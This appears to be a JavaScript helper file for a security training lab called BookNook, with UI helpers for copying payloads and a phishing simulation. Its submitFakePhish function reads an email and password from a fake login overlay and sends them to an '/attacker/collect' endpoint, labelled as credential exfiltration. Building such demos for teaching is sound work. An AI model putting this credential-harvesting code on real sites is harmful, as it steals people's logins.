/**
 * BookNook Security Demo — Client-Side Helpers
 */

function copyPayload(text, btnElement) {
  navigator.clipboard.writeText(text).then(() => {
    const originalText = btnElement.innerText;
    btnElement.innerText = "✓ Copied!";
    btnElement.style.background = "#10b981";
    btnElement.style.color = "#ffffff";
    setTimeout(() => {
      btnElement.innerText = originalText;
      btnElement.style.background = "";
      btnElement.style.color = "";
    }, 2000);
  });
}

function toggleLabDrawer() {
  const body = document.getElementById("lab-panel-content");
  const arrow = document.getElementById("lab-arrow");
  if (!body) return;
  if (body.style.display === "none" || body.style.display === "") {
    body.style.display = "block";
    if (arrow) arrow.innerText = "▲";
  } else {
    body.style.display = "none";
    if (arrow) arrow.innerText = "▼";
  }
}

// Phishing attack simulation handler
function submitFakePhish(event) {
  event.preventDefault();
  const email = document.getElementById("phish-email")?.value || "unknown";
  const pass = document.getElementById("phish-pass")?.value || "unknown";
  
  // Exfiltrate stolen credentials to the attacker receiver endpoint
  fetch(`/attacker/collect?credential_theft=${encodeURIComponent(JSON.stringify({ email, pass, timestamp: new Date().toISOString() }))}`)
    .then(() => {
      alert("Credentials sent to Attacker Listener! Closing phishing overlay.");
      const modal = document.querySelector(".fake-phishing-modal");
      if (modal) modal.remove();
    });
}
